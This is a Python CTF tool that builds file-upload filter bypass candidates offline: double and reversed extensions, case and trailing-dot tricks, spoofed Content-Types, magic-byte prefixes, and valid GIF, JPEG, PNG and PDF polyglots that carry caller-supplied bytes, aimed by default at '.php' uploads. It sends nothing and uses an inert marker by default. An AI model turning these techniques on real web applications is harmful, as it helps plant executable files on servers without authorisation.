#!/usr/bin/env python3
"""Offline file-upload bypass candidate builder.

This hand tool creates bytes and multipart metadata for a player to replay against
the squad's one assigned CTF target.  It never opens a socket, imports the live
web client, submits a flag, or guesses a target.  The default payload is an inert
marker; executable content is produced only when the caller explicitly supplies
those bytes.

The candidates cover four independent upload checks that commonly disagree:

* filename checks (direct, double extension, reversed double extension, case),
* per-part Content-Type checks,
* leading magic-byte checks, and
* parser-friendly GIF/JPEG/PNG/PDF containers carrying the caller's bytes.

The output is deliberately a ranked list for a human.  It is not an uploader.

Examples::

    .venv/bin/python solvers/web/upload_builder.py --stem avatar \
        --script-ext .php --allowed-ext .jpg --limit 20 --json
    .venv/bin/python solvers/web/upload_builder.py --payload-file marker.bin \
        --select 7 --output candidate.bin
"""

from __future__ import annotations

import argparse
import base64
import binascii
import hashlib
import json
import re
import struct
import sys
import zlib
from pathlib import Path


MAX_CONTENT = 4 * 1024 * 1024
MAX_CANDIDATES = 256
DEFAULT_MARKER = b"CSCTF_UPLOAD_MARKER_INERT_V1"


class UploadBuilderError(ValueError):
    """Raised when an offline upload-builder input is malformed or over a bound."""

FORMAT_INFO = {
    "gif": {"extension": ".gif", "content_type": "image/gif", "magic": b"GIF89a"},
    "jpeg": {"extension": ".jpg", "content_type": "image/jpeg", "magic": b"\xff\xd8\xff\xe0"},
    "png": {"extension": ".png", "content_type": "image/png", "magic": b"\x89PNG\r\n\x1a\n"},
    "pdf": {"extension": ".pdf", "content_type": "application/pdf", "magic": b"%PDF-1.4"},
}
_TOKEN = re.compile(r"^[!#$%&'*+.^_`|~0-9A-Za-z-]+$")
_MEDIA_TYPE = re.compile(r"^[!#$&^_.+0-9A-Za-z-]+/[!#$&^_.+0-9A-Za-z-]+$")

# A Pillow-generated, baseline 1x1 white JPEG.  Keeping the complete image as
# inert constant bytes lets the builder remain stdlib-only while every JPEG
# carrier still has DQT/SOF/DHT/SOS scan data that real image decoders accept.
_JPEG_1X1 = base64.b64decode(
    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8U"
    "HRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgN"
    "DRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy"
    "MjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQF"
    "BgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEI"
    "I0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNk"
    "ZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLD"
    "xMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEB"
    "AQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJB"
    "UQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZH"
    "SElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaan"
    "qKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oA"
    "DAMBAAIRAxEAPwD3+iiigD//2Q=="
)


def _content_bytes(value: bytes | bytearray | str) -> bytes:
    if isinstance(value, str):
        value = value.encode("utf-8")
    data = bytes(value)
    if len(data) > MAX_CONTENT:
        raise UploadBuilderError(f"content is {len(data)} bytes; maximum is {MAX_CONTENT}")
    return data


def _extension(value: str, label: str) -> str:
    value = str(value or "").strip()
    if not value:
        raise UploadBuilderError(f"{label} must not be empty")
    if not value.startswith("."):
        value = "." + value
    if len(value) > 32 or any(c in value for c in "/\\\x00\r\n"):
        raise UploadBuilderError(f"unsafe {label}: {value!r}")
    if not re.fullmatch(r"\.[A-Za-z0-9._+-]+", value):
        raise UploadBuilderError(f"unsupported characters in {label}: {value!r}")
    return value


def _stem(value: str) -> str:
    value = str(value or "").strip()
    if not value or value in (".", ".."):
        raise UploadBuilderError("stem must name one file")
    if (len(value) > 128 or any(c in value for c in "/\\\"")
            or any(ord(c) < 0x20 or ord(c) == 0x7F for c in value)):
        raise UploadBuilderError("stem must be a single safe filename component")
    return value


def filename_variants(stem: str = "upload", script_ext: str = ".php",
                      allowed_ext: str = ".jpg") -> list[dict]:
    """Ranked filename interpretations, all offline strings.

    ``script_ext`` is the extension the application is expected to reject and
    ``allowed_ext`` is the extension it is expected to accept.  No NUL/newline
    variants are emitted: those are transport-dependent and too easy to replay
    incorrectly.  The two double-extension orderings are kept explicit.
    """
    stem = _stem(stem)
    script_ext = _extension(script_ext, "script extension")
    allowed_ext = _extension(allowed_ext, "allowed extension")
    rows = [
        ("direct", stem + script_ext, "baseline: rejected extension with no filename bypass"),
        ("double_allowed_last", stem + script_ext + allowed_ext,
         "double extension: an allowlist may inspect only the final suffix"),
        ("double_script_last", stem + allowed_ext + script_ext,
         "reversed double extension: storage and execution layers may choose different suffixes"),
        ("mixed_case", stem + script_ext.swapcase() + allowed_ext,
         "case-folding mismatch plus an allowed final suffix"),
        ("trailing_dot", stem + script_ext + ".",
         "trailing-dot normalization mismatch (not equivalent on every filesystem)"),
    ]
    out = []
    seen = set()
    for technique, filename, reason in rows:
        if filename in seen:
            continue
        seen.add(filename)
        out.append({"rank": len(out) + 1, "technique": technique,
                    "filename": filename, "reason": reason})
    return out


def magic_prefixed(format_name: str, content: bytes | bytearray | str) -> bytes:
    """Return a shallow magic-byte bypass: signature followed by caller bytes."""
    fmt = str(format_name).lower()
    if fmt not in FORMAT_INFO:
        raise UploadBuilderError(f"unknown format {format_name!r}; choose {', '.join(FORMAT_INFO)}")
    return FORMAT_INFO[fmt]["magic"] + _content_bytes(content)


def _gif_polyglot(content: bytes) -> bytes:
    # Valid 1x1 GIF89a.  Caller bytes live in one or more Comment Extension
    # sub-blocks, so they remain literal while an image parser can consume it.
    blocks = b"".join(bytes((len(content[i:i + 255]),)) + content[i:i + 255]
                      for i in range(0, len(content), 255)) + b"\x00"
    header = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00"
              b"\x00\x00\x00\xff\xff\xff")
    comment = b"!\xfe" + blocks
    image = b",\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
    return header + comment + image


def _jpeg_polyglot(content: bytes) -> bytes:
    # Insert one or more COM segments immediately after SOI in a complete,
    # decodable baseline JPEG.  The caller bytes stay literal in metadata.
    comments = []
    chunks = [content[i:i + 65533] for i in range(0, len(content), 65533)] or [b""]
    for chunk in chunks:
        comments.append(b"\xff\xfe" + struct.pack(">H", len(chunk) + 2) + chunk)
    app0_end = 4 + struct.unpack(">H", _JPEG_1X1[4:6])[0]
    return _JPEG_1X1[:app0_end] + b"".join(comments) + _JPEG_1X1[app0_end:]


def _png_chunk(kind: bytes, data: bytes) -> bytes:
    return (struct.pack(">I", len(data)) + kind + data
            + struct.pack(">I", binascii.crc32(kind + data) & 0xFFFFFFFF))


def _png_polyglot(content: bytes) -> bytes:
    # Valid 1x1 RGBA PNG.  The inert carrier is an ancillary tEXt chunk.
    # NUL has delimiter semantics in tEXt, so fall back to base64 for binary
    # payloads and label that encoding inside the chunk.
    if b"\x00" in content:
        carried = b"base64:" + base64.b64encode(content)
    else:
        carried = content
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0)
    raw_pixel = b"\x00\x00\x00\x00\x00"  # filter byte + transparent RGBA
    return (FORMAT_INFO["png"]["magic"] + _png_chunk(b"IHDR", ihdr)
            + _png_chunk(b"tEXt", b"Comment\x00" + carried)
            + _png_chunk(b"IDAT", zlib.compress(raw_pixel))
            + _png_chunk(b"IEND", b""))


def _pdf_polyglot(content: bytes) -> bytes:
    # A small valid PDF.  The caller's bytes are the contents of an unreferenced
    # stream object: literal bytes are retained without making them page code.
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>",
        b"<< /Length 0 >>\nstream\n\nendstream",
        b"<< /Type /EmbeddedFile /Length " + str(len(content)).encode("ascii")
        + b" >>\nstream\n" + content + b"\nendstream",
    ]
    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = [0]
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += f"{number} 0 obj\n".encode("ascii") + body + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n".encode("ascii")
    out += b"0000000000 65535 f \n"
    for offset in offsets[1:]:
        out += f"{offset:010d} 00000 n \n".encode("ascii")
    out += (f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\n"
            f"startxref\n{xref}\n%%EOF\n").encode("ascii")
    return bytes(out)


def build_polyglot(format_name: str, content: bytes | bytearray | str) -> bytes:
    """Build a parser-friendly container carrying ``content`` literally when possible.

    PNG binary content containing NUL bytes is base64-labelled in its tEXt chunk;
    the other carriers retain the bytes.  These are upload-filter test artifacts,
    not proof that the stored object will be executable.
    """
    fmt = str(format_name).lower()
    data = _content_bytes(content)
    builders = {
        "gif": _gif_polyglot,
        "jpeg": _jpeg_polyglot,
        "png": _png_polyglot,
        "pdf": _pdf_polyglot,
    }
    if fmt not in builders:
        raise UploadBuilderError(f"unknown format {format_name!r}; choose {', '.join(builders)}")
    return builders[fmt](data)


def _candidate(filename: str, content_type: str, content: bytes, techniques: list[str],
               reason: str, carrier: str, safe_default: bool) -> dict:
    return {
        "rank": 0,
        "filename": filename,
        "content_type": content_type,
        "content": content,
        "size": len(content),
        "sha256": hashlib.sha256(content).hexdigest(),
        "techniques": techniques,
        "carrier": carrier,
        "reason": reason,
        "safe_default": bool(safe_default),
        "offline": True,
    }


def generate_candidates(*, stem: str = "upload", script_ext: str = ".php",
                        allowed_ext: str = ".jpg", content: bytes | bytearray | str = DEFAULT_MARKER,
                        formats: tuple[str, ...] | list[str] = ("gif", "jpeg", "png", "pdf"),
                        max_candidates: int = 64) -> list[dict]:
    """Return deterministic, ranked upload-part candidates; send nothing.

    The list is bounded even if the caller supplies many format names.  Candidate
    dictionaries retain raw ``content`` for direct use with the repository's
    existing ``web_exploit.multipart`` helper.  Use :func:`json_candidates` for
    a printable/base64 representation.
    """
    if not 1 <= int(max_candidates) <= MAX_CANDIDATES:
        raise UploadBuilderError(f"max_candidates must be 1..{MAX_CANDIDATES}")
    data = _content_bytes(content)
    safe_default = data == DEFAULT_MARKER
    names = filename_variants(stem, script_ext, allowed_ext)
    normalized_formats = []
    for value in formats:
        fmt = str(value).strip().lower()
        if fmt not in FORMAT_INFO:
            raise UploadBuilderError(f"unknown format {value!r}; choose {', '.join(FORMAT_INFO)}")
        if fmt not in normalized_formats:
            normalized_formats.append(fmt)
    if not normalized_formats:
        raise UploadBuilderError("at least one carrier format is required")

    out: list[dict] = []
    seen = set()

    def add(row: dict) -> None:
        key = (row["filename"], row["content_type"], row["content"])
        if key not in seen and len(out) < int(max_candidates):
            seen.add(key)
            row["rank"] = len(out) + 1
            out.append(row)

    direct = names[0]
    add(_candidate(direct["filename"], "application/octet-stream", data,
                   ["baseline"], direct["reason"], "plain", safe_default))

    # First isolate Content-Type trust with unchanged bytes and filename.
    for fmt in normalized_formats:
        info = FORMAT_INFO[fmt]
        add(_candidate(direct["filename"], info["content_type"], data,
                       ["content_type"], f"claims {info['content_type']} without changing the bytes",
                       "plain", safe_default))

    # Then isolate filename handling, using a MIME type suggested by allowed_ext.
    allowed_lower = allowed_ext.lower()
    allowed_mime = next((
        FORMAT_INFO[f]["content_type"] for f in normalized_formats
        if (allowed_lower.endswith(FORMAT_INFO[f]["extension"])
            or (f == "jpeg" and allowed_lower.endswith(".jpeg")))
    ), "application/octet-stream")
    for name in names[1:]:
        add(_candidate(name["filename"], allowed_mime, data,
                       [name["technique"]], name["reason"], "plain", safe_default))

    # Finally combine filename, MIME and byte-level parser interpretations.
    for fmt in normalized_formats:
        info = FORMAT_INFO[fmt]
        shallow = magic_prefixed(fmt, data)
        polyglot = build_polyglot(fmt, data)
        for name in names:
            add(_candidate(name["filename"], info["content_type"], shallow,
                           [name["technique"], "magic_bytes"],
                           f"{fmt} signature prefix; not guaranteed to decode as a complete {fmt} file",
                           f"{fmt}-magic-prefix", safe_default))
            add(_candidate(name["filename"], info["content_type"], polyglot,
                           [name["technique"], "polyglot"],
                           f"parser-friendly {fmt} carrier containing the supplied bytes",
                           f"{fmt}-container", safe_default))
    return out


def multipart_part(candidate: dict, field: str = "file") -> bytes:
    """Render one multipart *part* (not a whole request) from a candidate."""
    field = str(field)
    if not _TOKEN.fullmatch(field):
        raise UploadBuilderError("field must be a non-empty HTTP token")
    if not isinstance(candidate, dict) or not {"filename", "content_type", "content"} <= candidate.keys():
        raise UploadBuilderError("candidate must provide filename, content_type, and content")
    filename = str(candidate["filename"])
    if (any(c in filename for c in '"\\')
            or any(ord(c) < 0x20 or ord(c) == 0x7F for c in filename)):
        raise UploadBuilderError("candidate filename cannot contain quote, backslash, or control bytes")
    content_type = str(candidate["content_type"])
    if not _MEDIA_TYPE.fullmatch(content_type):
        raise UploadBuilderError("content type must be a simple type/subtype media type")
    content = _content_bytes(candidate["content"])
    return (f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n").encode("utf-8") + content


def json_candidates(rows: list[dict]) -> list[dict]:
    """Copy candidates into JSON-safe dictionaries with base64 payload bytes."""
    out = []
    for row in rows:
        if not isinstance(row, dict) or "content" not in row:
            raise UploadBuilderError("each candidate row must include content bytes")
        item = {k: v for k, v in row.items() if k != "content"}
        item["content_b64"] = base64.b64encode(row["content"]).decode("ascii")
        out.append(item)
    return out


def _parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="build offline file-upload bypass candidates (sends nothing)")
    p.add_argument("--stem", default="upload", help="base filename without an extension")
    p.add_argument("--script-ext", default=".php", help="extension the upload filter rejects")
    p.add_argument("--allowed-ext", default=".jpg", help="extension the upload filter accepts")
    p.add_argument("--formats", default="gif,jpeg,png,pdf", help="comma-separated carrier formats")
    payload = p.add_mutually_exclusive_group()
    payload.add_argument("--text", help="explicit caller-supplied UTF-8 bytes (default is an inert marker)")
    payload.add_argument("--payload-file", type=Path, help="explicit caller-supplied bytes")
    p.add_argument("--limit", type=int, default=64, help=f"candidate cap (1..{MAX_CANDIDATES})")
    p.add_argument("--json", action="store_true", help="print all bytes as base64 JSON")
    p.add_argument("--select", type=int, help="select one 1-based candidate (for --output or display)")
    p.add_argument("--output", type=Path, help="write only the selected candidate bytes to this path")
    return p


def _read_payload_file(path: Path) -> bytes:
    """Read at most MAX_CONTENT+1 bytes so an oversized input is rejected before allocation."""
    with path.open("rb") as handle:
        data = handle.read(MAX_CONTENT + 1)
    if len(data) > MAX_CONTENT:
        raise UploadBuilderError(f"payload file exceeds {MAX_CONTENT} bytes")
    return data


def main(argv: list[str] | None = None) -> int:
    try:
        args = _parser().parse_args(argv)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    try:
        if args.payload_file is not None:
            content = _read_payload_file(args.payload_file)
        elif args.text is not None:
            content = args.text.encode("utf-8")
        else:
            content = DEFAULT_MARKER
        formats = tuple(x.strip() for x in args.formats.split(",") if x.strip())
        rows = generate_candidates(stem=args.stem, script_ext=args.script_ext,
                                   allowed_ext=args.allowed_ext, content=content,
                                   formats=formats, max_candidates=args.limit)
        if args.select is not None:
            if not 1 <= args.select <= len(rows):
                raise UploadBuilderError(f"--select must be 1..{len(rows)}")
            rows = [rows[args.select - 1]]
        if args.output is not None:
            if args.select is None:
                raise UploadBuilderError("--output requires --select so only one artifact is written")
            args.output.write_bytes(rows[0]["content"])
            print(json.dumps({"written": str(args.output), "rank": rows[0]["rank"],
                              "size": rows[0]["size"], "sha256": rows[0]["sha256"],
                              "offline": True}, sort_keys=True))
            return 0
        if args.json:
            print(json.dumps({"offline": True, "sent": False,
                              "default_payload_is_inert": content == DEFAULT_MARKER,
                              "candidates": json_candidates(rows)}, indent=2, sort_keys=True))
            return 0
        print("OFFLINE ONLY - generated multipart-part candidates; no request was sent")
        print("rank  filename                     content-type              carrier              bytes  sha256")
        for row in rows:
            print(f"{row['rank']:>4}  {row['filename'][:27]:<27}  {row['content_type'][:24]:<24}  "
                  f"{row['carrier'][:19]:<19}  {row['size']:>5}  {row['sha256'][:12]}")
        print("Use --json for base64 bytes, or --select N --output FILE for one chosen artifact.")
        return 0
    except (OSError, ValueError) as exc:
        print(f"upload_builder: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
